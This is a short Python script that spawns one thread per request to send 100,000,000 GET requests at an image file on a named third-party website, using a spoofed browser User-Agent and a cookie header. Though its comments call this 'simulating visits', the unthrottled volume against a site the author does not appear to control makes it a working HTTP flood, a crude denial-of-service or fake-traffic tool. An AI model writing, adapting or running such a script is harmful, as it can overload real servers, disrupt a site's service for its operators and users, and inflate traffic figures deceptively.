import requests
import threading

# URL of the website you want to send traffic to
url = 'https://iptv-nederland.com/wp-content/uploads/al_opt_content/IMAGE/iptv-nederland.com//wp-content/uploads/2023/07/nominados-mejor-poster-2019-josssy-1200x752-1.webp.bv.webp?bv_host=iptv-nederland.com'

# Number of visits you want to simulate
number_of_visits = 100000000

# Define the headers with a User-Agent
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Cookie': 'hcdn=Caused'
}



def send_request(visit_number):
    try:
        # Make the request with the User-Agent header
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"Visit {visit_number}: Success")
        else:
            print(f"Visit {visit_number}: Failed with status code {response.status_code}")
    except Exception as e:
        print(f"Visit {visit_number}: Failed with exception {e}")

def simulate_traffic():
    threads = []
    for i in range(number_of_visits):
        thread = threading.Thread(target=send_request, args=(i + 1,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    simulate_traffic()
